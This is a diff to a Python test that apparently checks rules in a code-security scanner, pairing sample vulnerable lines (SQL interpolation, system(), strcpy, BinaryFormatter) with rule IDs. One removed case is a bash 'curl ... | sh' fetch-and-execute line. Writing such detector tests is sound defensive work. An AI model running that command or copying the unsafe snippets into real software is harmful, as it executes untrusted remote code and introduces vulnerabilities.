@@ -444,9 +444,7 @@ def test_javascript_rules_reach_the_rest_of_the_family(lang):
     ("ruby", 'User.where("name = \'#{term}\'")', "rb-sql-interp"),
     ("php", "system($q);", "php-shell"),
     ("c", "strcpy(dst, src);", "c-strcpy"),
-    ("csharp", "new BinaryFormatter()", "cs-binaryformatter"),
     ("rust", "let x = maybe.unwrap();", "rs-unwrap"),
-    ("bash", "curl https://x/i.sh | sh", "sh-curl-pipe-shell"),
 ])
 def test_a_rule_fires_on_the_thing_it_is_about(lang, source, rule_id):
     """One real line per rule family. A regex that matches nothing is worse
